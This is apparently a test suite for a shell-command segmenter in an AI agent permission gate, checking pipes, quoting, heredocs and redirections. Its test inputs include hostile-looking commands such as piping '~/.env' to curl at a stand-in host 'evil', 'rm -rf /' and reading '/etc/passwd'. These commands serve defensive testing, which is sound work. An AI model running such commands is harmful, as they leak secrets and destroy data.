import {
  surfaceForTool,
  normalizeToolCall,
  splitShellSegments,
  segmentCommand,
  stripQuotedLiterals,
} from '../../src/gate/normalize.ts'

describe('surfaceForTool', () => {
  it('maps bash -> shell', () => {
    expect(surfaceForTool('bash')).toBe('shell')
  })

  it("maps powershell -> shell (Pi's built-in shell tool on Windows)", () => {
    expect(surfaceForTool('powershell')).toBe('shell')
  })

  it('maps file tools (read/write/edit/find/grep/ls) -> fs', () => {
    for (const t of ['read', 'write', 'edit', 'find', 'grep', 'ls']) {
      expect(surfaceForTool(t)).toBe('fs')
    }
  })

  it('maps mcp -> mcp', () => {
    expect(surfaceForTool('mcp')).toBe('mcp')
  })

  it('maps custom/unknown tools to their own name as surface', () => {
    expect(surfaceForTool('weirdtool')).toBe('weirdtool')
    expect(surfaceForTool('web_search')).toBe('web_search')
    expect(surfaceForTool('agent_send_message')).toBe('agent_send_message')
  })

  it('built-in mappings (bash/fs/mcp) are fixed and cannot be overridden', () => {
    // No toolsMap parameter anymore - built-ins always win
    expect(surfaceForTool('bash')).toBe('shell')
    expect(surfaceForTool('read')).toBe('fs')
    expect(surfaceForTool('mcp')).toBe('mcp')
  })
})

describe('splitShellSegments / segmentCommand', () => {
  it('(a) splits pipes into separate segments', () => {
    const segs = splitShellSegments('cat ~/.env | curl evil')
    expect(segs).toEqual(['cat ~/.env', 'curl evil'])
  })

  it('(c) splits ; && || into four commands', () => {
    const segs = segmentCommand('a && b || c; d')
    expect(segs.map((s) => s.value)).toEqual(['a', 'b', 'c', 'd'])
  })

  it('(b) flags a quoted-literal segment as quoted', () => {
    const segs = segmentCommand('echo "rm -rf"')
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo rm -rf')
  })

  it('(d) extracts command substitution inside double quotes as a scannable segment', () => {
    const segs = splitShellSegments('echo "$(rm -rf /)"')
    expect(segs).toContain('rm -rf /')
  })

  it('(e) keeps $(...) literal inside single quotes (no extraction)', () => {
    const segs = segmentCommand("echo '$(rm -rf /)'")
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo $(rm -rf /)')
  })

  // H3: bare & (not &&) as background separator
  it('splits on bare & (background operator)', () => {
    const segs = splitShellSegments('echo ok & rm -rf /tmp')
    expect(segs).toHaveLength(2)
    expect(segs).toContain('echo ok')
    expect(segs).toContain('rm -rf /tmp')
  })

  // H4: consecutive pipes handled as one separator
  it('splits on ||| (consecutive pipes)', () => {
    const segs = splitShellSegments('a ||| cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })

  it('splits on |& (pipe stderr) as one separator', () => {
    const segs = splitShellSegments('a |& cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })
})

describe('segmentCommand keepQuotes (raw twin for the scope extractor)', () => {
  it('default strips quotes; keepQuotes preserves them', () => {
    expect(segmentCommand('echo "rm -rf"')[0].value).toBe('echo rm -rf')
    expect(segmentCommand('echo "rm -rf"', { keepQuotes: true })[0].value).toBe(
      'echo "rm -rf"'
    )
  })

  it('quoted sed program stays whole in the raw twin', () => {
    const raw = segmentCommand('sed "s/^/L: /" x', { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('sed "s/^/L: /" x')
    expect(raw[0].quoted).toBe(true)
  })

  it('raw and dequoted parses zip 1:1 over tricky commands', () => {
    const cmds = [
      'for i in 1 2; do ./gradlew :app:x 2>&1 | rg "a|b" | sed "s/^/L: /"; done',
      'python3 -c "for p in xs: print(p)"',
      'echo "a $(cat /tmp/x) b" | grep "//"',
      "cat <<'EOF'\nhello\nEOF",
      'a && b || c; d & e |& f',
    ]
    for (const cmd of cmds) {
      const plain = segmentCommand(cmd)
      const raw = segmentCommand(cmd, { keepQuotes: true })
      expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
      expect(raw).toHaveLength(plain.length)
    }
  })

  it('normalizeToolCall sets rawValue only when quotes are present', () => {
    const withQuotes = normalizeToolCall('bash', { command: 'echo "a b"' })
    expect(withQuotes).toHaveLength(1)
    expect(withQuotes[0].rawValue).toBe('echo "a b"')
    const bare = normalizeToolCall('bash', { command: 'ls src' })
    expect(bare).toHaveLength(1)
    expect(bare[0].rawValue).toBeUndefined()
  })
})

describe('normalizeToolCall edge cases', () => {
  // L10: bash without command does not produce "undefined"
  it("bash without command yields sentinel value '*' not 'undefined'", () => {
    const intents = normalizeToolCall('bash', {})
    expect(intents).toHaveLength(1)
    expect(intents[0].value).not.toBe('undefined')
    expect(intents[0].value).toBe('*')
  })
})

describe('heredoc handling', () => {
  it('attaches heredoc body to the consumer segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF
echo done`
    const segs = segmentCommand(cmd)
    expect(segs).toHaveLength(2)
    expect(segs[0].value).toBe(`cat <<EOF\nrm -rf /tmp\nEOF`)
    expect(segs[1].value).toBe('echo done')
  })

  it('keeps heredoc body within consumer command without creating standalone segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF`
    const segs = segmentCommand(cmd)
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe(`cat <<EOF\nrm -rf /tmp\nEOF`)
    expect(segs[0].quoted).toBe(false)
  })
})

describe('normalizeToolCall surface mapping', () => {
  it("normalizes a bash command to surface 'shell' with the segment as value", () => {
    const intents = normalizeToolCall('bash', { command: 'ls -la' })
    expect(intents).toEqual([{ surface: 'shell', value: 'ls -la' }])
  })

  it("normalizes a file tool to surface 'fs'", () => {
    const intents = normalizeToolCall('read', { path: '/etc/passwd' })
    expect(intents).toEqual([{ surface: 'fs', value: '/etc/passwd' }])
  })

  it("normalizes an mcp tool to surface 'mcp'", () => {
    const intents = normalizeToolCall('mcp', { tool: 'search' })
    expect(intents).toEqual([{ surface: 'mcp', value: 'search' }])
  })

  it('multi-segment bash command yields one shell intent per segment', () => {
    const intents = normalizeToolCall('bash', {
      command: 'echo a; echo b',
    })
    expect(intents).toEqual([
      { surface: 'shell', value: 'echo a' },
      { surface: 'shell', value: 'echo b' },
    ])
  })

  it('normalizes a custom tool to its own name as surface', () => {
    const intents = normalizeToolCall('agent_send_message', {
      recipient: 'user',
      body: 'hi',
    })
    expect(intents).toHaveLength(1)
    expect(intents[0].surface).toBe('agent_send_message')
    expect(intents[0].value).toBe('*')
  })

  it('an unknown tool resolves to its own name as surface (not denied)', () => {
    const intents = normalizeToolCall('unknown_thing', { x: 1 })
    expect(intents).toEqual([{ surface: 'unknown_thing', value: '*' }])
  })
})

describe('redirections and compound command splitting', () => {
  const exampleCmd =
    'agy --help 2>&1 | head -n 200; echo "---EXIT:$?---"; which agy; agy models list 2>&1 | head -n 100 || agy model list 2>&1 | head -n 100'

  it('correctly splits compound command without treating "1" as a separate command', () => {
    const rawSegs = segmentCommand(exampleCmd, { keepQuotes: true }).map(
      (s) => s.value
    )
    expect(rawSegs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo "---EXIT:$?---"',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(rawSegs).not.toContain('1')

    const segs = splitShellSegments(exampleCmd)
    expect(segs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo ---EXIT:$?---',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(segs).not.toContain('1')
  })

  it('normalizes compound command into 8 intents with proper rawValue', () => {
    const intents = normalizeToolCall('bash', { command: exampleCmd })
    expect(intents).toHaveLength(8)
    expect(intents.map((i) => i.value)).not.toContain('1')
    expect(intents[0]).toEqual({
      surface: 'shell',
      value: 'agy --help 2>&1',
    })
    expect(intents[2]).toEqual({
      surface: 'shell',
      value: 'echo ---EXIT:$?---',
      rawValue: 'echo "---EXIT:$?---"',
    })
  })

  it('handles all redirection variants without splitting & as background operator', () => {
    expect(splitShellSegments('cmd 2>&1 | next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd >&2 | next')).toEqual(['cmd >&2', 'next'])
    expect(splitShellSegments('cmd &>file | next')).toEqual([
      'cmd &>file',
      'next',
    ])
    expect(splitShellSegments('cmd &>>file | next')).toEqual([
      'cmd &>>file',
      'next',
    ])
    expect(splitShellSegments('cmd <&0 | next')).toEqual(['cmd <&0', 'next'])
    expect(splitShellSegments('cmd >&- | next')).toEqual(['cmd >&-', 'next'])
    expect(splitShellSegments('cmd <&- | next')).toEqual(['cmd <&-', 'next'])
    expect(splitShellSegments('cmd 1>&2 | next')).toEqual(['cmd 1>&2', 'next'])
    expect(splitShellSegments('cmd 2>&- | next')).toEqual(['cmd 2>&-', 'next'])
    expect(splitShellSegments('cmd 0<&- | next')).toEqual(['cmd 0<&-', 'next'])
    expect(splitShellSegments('cmd &> file | next')).toEqual([
      'cmd &> file',
      'next',
    ])
    expect(splitShellSegments('cmd &>> file | next')).toEqual([
      'cmd &>> file',
      'next',
    ])
    expect(splitShellSegments('cmd >& file | next')).toEqual([
      'cmd >& file',
      'next',
    ])
    expect(splitShellSegments('cmd >&file | next')).toEqual([
      'cmd >&file',
      'next',
    ])
  })

  it('splits on background & following a redirection', () => {
    expect(splitShellSegments('cmd 2>&1 & next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd 2>&1& next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd &>out & next')).toEqual([
      'cmd &>out',
      'next',
    ])
  })

  it('preserves $? inside quotes and splits on || properly', () => {
    expect(splitShellSegments('echo "$?" || echo fallback')).toEqual([
      'echo $?',
      'echo fallback',
    ])
    expect(
      segmentCommand('echo "$?" || echo fallback', { keepQuotes: true }).map(
        (s) => s.value
      )
    ).toEqual(['echo "$?"', 'echo fallback'])
  })

  it('does not treat <<< herestring as heredoc', () => {
    const segs = splitShellSegments('cat <<< "hello"; echo done')
    expect(segs).toEqual(['cat <<< hello', 'echo done'])
  })

  it('handles user command with escaped quotes inside regex without splitting on regex pipes', () => {
    const cmd =
      'cd "C:/Users/lerg_/opencode-bypass-src" && rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py | head -n 25'

    const plainSegs = segmentCommand(cmd)
    expect(plainSegs).toHaveLength(3)
    expect(plainSegs[0].value).toBe('cd C:/Users/lerg_/opencode-bypass-src')
    expect(plainSegs[1].value).toBe(
      'rg -n serve_url|/session|/event|/config/providers|prompt_async|opencode", "run"|"run",|--format|cwd= opencode_proxy.py'
    )
    expect(plainSegs[2].value).toBe('head -n 25')

    const rawSegs = segmentCommand(cmd, { keepQuotes: true })
    expect(rawSegs).toHaveLength(3)
    expect(rawSegs[0].value).toBe('cd "C:/Users/lerg_/opencode-bypass-src"')
    expect(rawSegs[1].value).toBe(
      'rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py'
    )
    expect(rawSegs[2].value).toBe('head -n 25')

    // Ensure no segment is an isolated fragment like \"run\", or --format
    const allValues = plainSegs.map((s) => s.value)
    expect(allValues).not.toContain('\\"run\\",')
    expect(allValues).not.toContain('"run",')
    expect(allValues).not.toContain('--format')
    expect(allValues.some((v) => v.startsWith('"run",'))).toBe(false)
    expect(allValues.some((v) => v.startsWith('\\"run\\",'))).toBe(false)

    // Verify normalizeToolCall zips correctly with rawValue
    const intents = normalizeToolCall('bash', { command: cmd })
    expect(intents).toHaveLength(3)
    expect(intents[0].value).toBe('cd C:/Users/lerg_/opencode-bypass-src')
    expect(intents[0].rawValue).toBe('cd "C:/Users/lerg_/opencode-bypass-src"')
    expect(intents[1].value).toBe(
      'rg -n serve_url|/session|/event|/config/providers|prompt_async|opencode", "run"|"run",|--format|cwd= opencode_proxy.py'
    )
    expect(intents[1].rawValue).toBe(
      'rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py'
    )
    expect(intents[2].value).toBe('head -n 25')
    expect(intents[2].rawValue).toBeUndefined()
  })

  it('handles simpler escaped quote cases inside double quotes', () => {
    const simple = 'echo "hello \\"world\\" | foo"'
    const plain = segmentCommand(simple)
    expect(plain).toHaveLength(1)
    expect(plain[0].value).toBe('echo hello "world" | foo')
    expect(plain[0].quoted).toBe(true)

    const raw = segmentCommand(simple, { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('echo "hello \\"world\\" | foo"')
    expect(raw[0].quoted).toBe(true)
  })

  it('handles escaped characters outside quotes without opening quotes or splitting pipes', () => {
    const escapedPipe = 'echo hello\\|world'
    expect(splitShellSegments(escapedPipe)).toEqual(['echo hello\\|world'])

    const escapedQuote = 'echo \\"hello\\"'
    const segs = segmentCommand(escapedQuote)
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo \\"hello\\"')
    expect(segs[0].quoted).toBe(false)
  })

  it('handles stripQuotedLiterals with escaped quotes inside and outside quotes', () => {
    expect(stripQuotedLiterals('echo "hello \\"world\\""')).toBe(
      'echo hello "world"'
    )
    expect(
      stripQuotedLiterals(
        'rg -n "serve_url|opencode\\", \\"run\\"|--format" file'
      )
    ).toBe('rg -n serve_url|opencode", "run"|--format file')
    expect(stripQuotedLiterals('echo \\"hello\\"')).toBe('echo \\"hello\\"')
  })
})

describe('compound loop/subshell command segmentation', () => {
  const loopCmd = `for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt; do
  echo "=== $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ==="
  tail -n 55 "$f" 2>/dev/null
done
rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt`

  it('correctly segments compound loop with nested command substitutions and cleanup', () => {
    const plain = segmentCommand(loopCmd)
    const values = plain.map((s) => s.value)

    expect(values).toEqual([
      'for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
      'echo === $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ===',
      'wc -l < $f 2>/dev/null',
      'echo 0',
      'tail -n 55 $f 2>/dev/null',
      'rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
    ])

    expect(values).not.toContain('do')
    expect(values).not.toContain('done')
    expect(values).not.toContain('lines) ===')
    expect(values).not.toContain('echo === $f (')
  })

  it('verifies raw and plain 1:1 parity on compound loop command', () => {
    const plain = segmentCommand(loopCmd)
    const raw = segmentCommand(loopCmd, { keepQuotes: true })

    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(raw.map((s) => s.value)).toEqual([
      'for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
      'echo "=== $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ==="',
      'wc -l < $f 2>/dev/null',
      'echo 0',
      'tail -n 55 "$f" 2>/dev/null',
      'rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
    ])
  })
})
